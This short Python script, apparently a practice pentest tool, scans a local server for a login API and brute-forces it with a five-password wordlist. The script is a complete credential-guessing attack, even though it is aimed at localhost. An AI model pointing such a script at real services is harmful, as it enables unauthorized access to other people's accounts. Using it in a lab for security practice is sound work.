# pentest_tool_fast.py
import requests
import time

BASE_URL = "http://127.0.0.1:5000"

# Common API paths to try first
COMMON_PATHS = [
    "/api/auth",
    "/api/login",
    "/api/v1/auth",
    "/hidden/api/auth",
    "/socialhub/api/auth",
]

# Small safe wordlist for brute force
WORDLIST = ["123456", "password", "letmein", "hunter2", "admin2025"]

def find_api():
    """Find the API endpoint using a small wordlist."""
    print("[*] Scanning for API endpoint...")
    for path in COMMON_PATHS:
        url = BASE_URL + path
        try:
            r = requests.post(url, json={"password": "test"})
            if r.status_code in [200, 401]:
                print(f"[+] Found API endpoint: {url}")
                return url
        except requests.exceptions.RequestException:
            pass
    print("[-] API not found")
    return None

def brute_force(api_url):
    """Brute force passwords against the found API."""
    print("[*] Starting brute force attack...")
    for pwd in WORDLIST:
        r = requests.post(api_url, json={"password": pwd})
        if r.status_code == 200:
            print(f"[✅] Correct password found: {pwd}")
            return
        else:
            print(f"[❌] Wrong password: {pwd}")
        time.sleep(0.2)  # mimic real-world delays
    print("[-] Password not found in list")

if __name__ == "__main__":
    endpoint = find_api()
    if endpoint:
        brute_force(endpoint)
